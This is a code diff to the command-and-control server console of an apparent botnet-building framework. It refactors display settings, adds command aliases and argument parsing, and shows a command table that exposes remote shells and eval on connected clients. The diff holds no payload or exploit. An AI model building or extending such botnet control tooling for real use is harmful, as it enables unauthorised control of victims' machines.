@@ -166,10 +166,10 @@ class C2(Server):
     
     """
     _lock           = threading.Lock()
-    _text_color     = 'red'
-    _text_style     = 'dim'
-    _prompt_color   = 'reset'
-    _prompt_style   = 'bright'
+    _text_color     = 'RED'
+    _text_style     = 'DIM'
+    _prompt_color   = 'RESET'
+    _prompt_style   = 'BRIGHT'
 
     def __init__(self, host='0.0.0.0', port=1337, db=':memory:'):
         """ 
@@ -182,7 +182,7 @@ class C2(Server):
 
         Returns a byob.server.C2 instance
         
-    """
+        """
         Server.__init__(self, host=host, port=port, handler=handlers.SessionHandler)
         self._active            = threading.Event()
         self._count             = 1
@@ -190,16 +190,20 @@ class C2(Server):
         self.current_session    = None
         self.sessions           = {}
         self.banner             = self._banner()
-        self.database       = database.Database(db)
+        self.database           = database.Database(db)
         self.commands           = {
+            'set'           :   self.set,
             'help'          :   self.help,
             'exit'          :   self.quit,
             'quit'          :   self.quit,
             '$'             :   self.eval,
             'eval'          :   self.eval,
+            'debug'         :   self.eval,
+            'db'            :   self.query,
             'query'         :   self.query,
-            'settings'      :   self.settings,
+            'database'      :   self.query,
             'options'       :   self.settings,
+            'settings'      :   self.settings,
             'sessions'      :   self.session_list,
             'clients'       :   self.session_list,
             'shell'         :   self.session_shell,
@@ -257,7 +261,7 @@ class C2(Server):
 
     def _banner(self):
         try:
-            banner = __doc__ if __doc__ else "Command & Control (Build Your Own Botnet)"
+            banner = __doc__ if __doc__ else "Command & Control Server (Build Your Own Botnet)"
             with self._lock:
                 util.display(banner, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
                 util.display("[?] ", color='yellow', style='bright', end=',')
@@ -265,6 +269,11 @@ class C2(Server):
             return banner
         except Exception as e:
             self._error(str(e))
+
+    def _get_arguments(self, data):
+        args = tuple([i for i in data.split() if '=' not in i])
+        kwds = dict({i.partition('=')[0]: i.partition('=')[2] for i in str(data).split() if '=' in i})
+        return collections.namedtuple('Arguments', ('args','kwargs'))(args, kwds)
 
     def _get_sessions(self):
         return [v for v in self.sessions.values()]
@@ -372,7 +381,7 @@ class C2(Server):
                 self._error("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
 
 
-    def query(self, statement, display=True):
+    def query(self, statement):
         """ 
         Query the database
 
@@ -380,94 +389,109 @@ class C2(Server):
         :param str statement:    SQL statement to execute
 
         """
-        self.database.execute_query(statement, returns=False, display=display)
+        self.database.execute_query(statement, returns=False, display=True)
 
 
-    def settings(self, args=None):
+    def settings(self):
+        """
+        Show the server's currently configured settings
+        
+        """
+        text_color   = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._text_color][0]
+        text_style   = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._text_style][0]
+        prompt_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._prompt_color][0]
+        prompt_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._prompt_style][0]
+        util.display('\n', end=',')
+        util.display('Settings'.center(40), color='reset', style='bright')
+        util.display('text color/style: {}'.format(' '.join((text_color, text_style)).center(40)), color='reset', style='dim')
+        util.display('prompt color/style: {}'.format(' '.join((prompt_color, prompt_style)).center(40)), color='reset', style='dim')
+        util.display('debug: {}'.format('true' if globals()['__debug'] else 'false'), color='reset', style='dim')
+
+
+    def set(self, args=None):
         """ 
-        Show/change display settings
+        Set display settings for the command & control console
 
-        `settings setting] [option] [value]`
+        Usage: `set [setting] [option]=[value]`
 
-        :setting text:      text displayed in console
-        :setting prompt:    prompt displayed in shells
-        :option color:      color attribute of a setting
-        :option style:      style attribute of a setting
-        :values color:      red, green, cyan, yellow, magenta
-        :values style:      normal, bright, dim
+            :setting text:      text displayed in console
+            :setting prompt:    prompt displayed in shells
+
+            :option color:      color attribute of a setting
+            :option style:      style attribute of a setting
+
+            :values color:      red, green, cyan, yellow, magenta
+            :values style:      normal, bright, dim
+
+        Example 1:         `set text color=green style=normal`
+        Example 2:         `set prompt color=white, style=bright`
 
         """
-        if not args:
-            try:
-                text_color   = [color for color in ['BLUE','CYAN','RED','BLACK','MAGENTA','GREEN','RESET'] if color == self._text_color.upper()][0]
-                text_style   = [style for style in ['DIM','BRIGHT','NORMAL'] if style == self._text_style.upper()][0]
-                prompt_color = [color for color in ['BLUE','CYAN','RED','BLACK','MAGENTA','GREEN','RESET'] if color == self._prompt_color.upper()][0]
-                prompt_style = [style for style in ['DIM','BRIGHT','NORMAL'] if style == self._prompt_style.upper()][0]
-            except Exception as e:
-                return '{} error: {}'.format(self.settings.func_name, str(e))
-            util.display('\n', end=',')
-            util.display('Settings'.center(40), color='reset', style='bright')
-            util.display('text color/style: {}'.format(' '.join((text_color, text_style)).center(40)), color='reset', style='dim')
-            util.display('prompt color/style: {}'.format(' '.join((prompt_color, prompt_style)).center(40)), color='reset', style='dim')
-            util.display('debug: {}'.format('true' if globals()['__debug'] else 'false'), color='reset', style='dim')
-            util.display('', color=self._text_color, style=self._text_style)
-        else:
-            target, _, options = args.partition(' ')
-            setting, _, option = options.partition(' ')
-            option = option.upper()
-            util.display('', color=self._text_color, style=self._text_style)
-            if target == 'prompt':
-                if setting == 'color':
-                    if not hasattr(colorama.Fore, option):
-                        util.display("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
-                        return
-                    self._prompt_color = option
-                    util.display("prompt color changed to ", color='reset', style='bright', end=',')
-                    util.display(option, color=self._prompt_color, style=self._prompt_style)
-                elif setting == 'style':
-                    if not hasattr(colorama.Style, option):
-                        util.display("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
-                        return
-                    self._prompt_style = option
-                    util.display("prompt style changed to ", color='reset', style='bright', end=',')
-                    util.display(option, color=self._prompt_color, style=self._prompt_style)
-                else:
-                    util.display("usage: settings prompt <option> [value]", color='reset', style='bright')
-            elif target == 'text':
-                if setting == 'color':
-                    if not hasattr(colorama.Fore, option):
-                        util.display("usage: settings text color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
-                        return
-                    self._text_color = option
-                    util.display("text color changed to ", color='reset', style='bright', end=',')
-                    util.display(option, color=self._text_color, style=self._text_style)
-                elif setting == 'style':
-                    if not hasattr(colorama.Style, option):
-                        util.display("usage: settings text style [value]\nstyles:   bright/normal/dim")
-                        return
-                    self._text_style = option
-                    util.display("text style changed to ", color='reset', style='bright', end=',')
-                    util.display(option, color=self._text_color, style=self._text_style)
-            elif target == 'debug':
-                if not setting:
-                    if globals()['__debug']:
-                        util.display("[!] ", color='yellow', style='bright', end=',')
-                        util.display("Debug: On", color='reset', style='bright')
-                    else:
-                        util.display("[-] ", color='yellow', style='dim', end=',')
-                        util.display("Debug: Off", color='reset', style='dim')
-                elif str(setting).lower() in ('0','off','false','disable'):
-                    globals()['__debug'] = False
-                    util.display("[-] ", color='yellow', style='dim', end=',')
-                    util.display("Debugging disabled", color='reset', style='dim')
-                elif str(setting).lower() in ('1','on','true','enable'):
-                    globals()['__debug'] = True
-                    util.display("[!] ", color='yellow', style='bright', end=',')
-                    util.display("Debugging enabled", color='reset', style='bright')            
-                else:
-                    self._error("invalid mode for 'debugging'")
+        if args:
+            arguments    = self._get_arguments(args)
+            args, kwargs = arguments.args, arguments.kwargs
+            if not arguments.args:
+                util.display("usage: set [setting] [option]=[value]\ncolors:   white/black/red/yellow/green/cyan/magenta]\nstyles:   dim/normal/bright", color=self._text_color, style=self._text_style)
+                return
             else:
-                util.display('\nDisplay Settings\n\n  usage:  settings <type> <option> <color|style>\n  \n    type   - text, prompt\n    option - color, style\n    color  - black, white, blue, red, green, magenta, yellow\n    style  - dim, normal, bright\n\nDebugging Mode\n\t\n  usage: settings debug <on|off>\n')
+                target = args[0]
+            if not arguments.kwargs:
+                util.display("usage: set [setting] [option]=[value]\ncolors:   white/black/red/yellow/green/cyan/magenta]\nstyles:   dim/normal/bright", color=self._text_color, style=self._text_style)
+                return
+            for setting, option in arguments.kwargs.items():
+                if target == 'prompt':
+                    if setting == 'color':
+                        if not hasattr(colorama.Fore, option):
+                            util.display("usage: set [setting] [option]=[value]\ncolors:   white/black/red/yellow/green/cyan/magenta]\nstyles:   dim/normal/bright", color=self._text_color, style=self._text_style)
+                            return
+                        self._prompt_color = option
+                        util.display("prompt color changed to ", color='reset', style='bright', end=',')
+                        util.display(option, color=self._prompt_color, style=self._prompt_style)
+                    elif setting == 'style':
+                        if not hasattr(colorama.Style, option):
+                            util.display("usage: set [setting] [option]=[value]\ncolors:   white/black/red/yellow/green/cyan/magenta]\nstyles:   dim/normal/bright", color=self._text_color, style=self._text_style)
+                            return
+                        self._prompt_style = option
+                        util.display("prompt style changed to ", color='reset', style='bright', end=',')
+                        util.display(option, color=self._prompt_color, style=self._prompt_style)
+                    else:
+                        util.display("usage: set [setting] [option]=[value]\ncolors:   white/black/red/yellow/green/cyan/magenta]\nstyles:   dim/normal/bright", color=self._text_color, style=self._text_style)
+                        return
+                elif target == 'text':
+                    if setting == 'color':
+                        if not hasattr(colorama.Fore, option):
+                            util.display("usage: set [setting] [option]=[value]\ncolors:   white/black/red/yellow/green/cyan/magenta]\nstyles:   dim/normal/bright", color=self._text_color, style=self._text_style)
+                            return
+                        self._text_color = option
+                        util.display("text color changed to ", color='reset', style='bright', end=',')
+                        util.display(option, color=self._text_color, style=self._text_style)
+                    elif setting == 'style':
+                        if not hasattr(colorama.Style, option):
+                            util.display("usage: set [setting] [option]=[value]\ncolors:   white/black/red/yellow/green/cyan/magenta]\nstyles:   dim/normal/bright", color=self._text_color, style=self._text_style)
+                            return
+                        self._text_style = option
+                        util.display("text style changed to ", color='reset', style='bright', end=',')
+                        util.display(option, color=self._text_color, style=self._text_style)
+                elif target == 'debug':
+                    if not setting:
+                        if globals()['__debug']:
+                            util.display("[!] ", color='yellow', style='bright', end=',')
+                            util.display("Debug: On", color='reset', style='bright')
+                        else:
+                            util.display("[-] ", color='yellow', style='dim', end=',')
+                            util.display("Debug: Off", color='reset', style='dim')
+                    elif str(setting).lower() in ('0','off','false','disable'):
+                        globals()['__debug'] = False
+                        util.display("[-] ", color='yellow', style='dim', end=',')
+                        util.display("Debugging disabled", color='reset', style='dim')
+                    elif str(setting).lower() in ('1','on','true','enable'):
+                        globals()['__debug'] = True
+                        util.display("[!] ", color='yellow', style='bright', end=',')
+                        util.display("Debugging enabled", color='reset', style='bright')            
+                    else:
+                        self._error("invalid mode for 'debugging'")
+        else:
+            util.display('\nDisplay Settings\n\n  usage:  settings <type> <option> <color|style>\n  \n    type   - text, prompt\n    option - color, style\n    color  - black, white, blue, red, green, magenta, yellow\n    style  - dim, normal, bright\n\nDebugging Mode\n\t\n  usage: set debug <on|off>\n')
 
     def task_list(self, id=None):
         """ 
